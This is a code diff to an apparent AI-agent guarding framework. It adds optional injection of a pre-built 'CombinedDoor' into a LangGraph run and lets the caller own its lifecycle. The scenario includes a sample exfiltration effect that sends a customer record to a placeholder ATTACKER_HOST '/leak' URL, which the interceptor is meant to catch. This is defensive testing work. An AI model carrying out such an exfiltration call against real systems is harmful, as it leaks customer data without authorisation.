@@ -296,7 +296,7 @@ def build_egress_env(*, task_id: str, clock=None) -> EgressEnv:
 class CombinedDoor:
     interceptor: EffectInterceptor
     db_door: Door                       # the UNCHANGED build_door (gateway/store/clock/mandate)
-    egress_env: EgressEnv
+    egress_env: Optional[EgressEnv]     # None when bound to a CALLER-run external proxy (no auto env)
     egress_binding: EgressProxyBinding
     egress_receipts: ReceiptLog
     mandate: Any
@@ -308,7 +308,8 @@ class CombinedDoor:
         return signet_guarded_tool(self.interceptor, tool_name=EGRESS_TOOL, id_arg="host")
 
     def stop(self) -> None:
-        self.egress_env.stop()
+        if self.egress_env is not None:   # nothing to tear down when the proxy is the caller's
+            self.egress_env.stop()
 
 
 def build_combined_door(mandate=None, *, clock=None) -> CombinedDoor:
@@ -377,15 +378,21 @@ def _exfil_effect() -> ProposedEffect:
         "url": f"https://{ATTACKER_HOST}/leak?data=customer_record"})
 
 
-def run_combined(*, clock=None):
+def run_combined(*, clock=None, door=None):
     """One LangGraph run, one frozen task: propose the DB credit then the egress exfil, each through
     the SAME interceptor. Returns (mandate, [db_result, egress_result], tier_label). The tier is
     `0 (advisory)` — the DB rail runs Tier 0 in-process and the egress rail is advisory (no netns).
+
+    ADDITIVE `door` injection (default None = unchanged): when a pre-built `CombinedDoor` is passed
+    (e.g. assembled by the on-ramp's `guard()`), it is used verbatim and its lifecycle is the
+    CALLER's — `run_combined` does NOT stop an injected door. With no `door`, it builds and stops its
+    own, exactly as before. This is the seam the on-ramp faithfulness test drives.
     """
     from signet.rails.supabase.resource_sim import SupabaseResourceError
     from langgraph.graph import StateGraph, START, END
 
-    door = build_combined_door(clock=clock)
+    owns_door = door is None
+    door = door if door is not None else build_combined_door(clock=clock)
     db_tool = door.db_tool()
     egress_tool = door.egress_tool()
     credit, exfil = _credit_effect(), _exfil_effect()
@@ -460,5 +467,6 @@ def run_combined(*, clock=None):
     try:
         state = graph.invoke({})
     finally:
-        door.stop()
+        if owns_door:                 # the caller owns an injected door's lifecycle (do not stop it)
+            door.stop()
     return door.mandate, [state["db_result"], state["egress_result"]], "0 (advisory)"
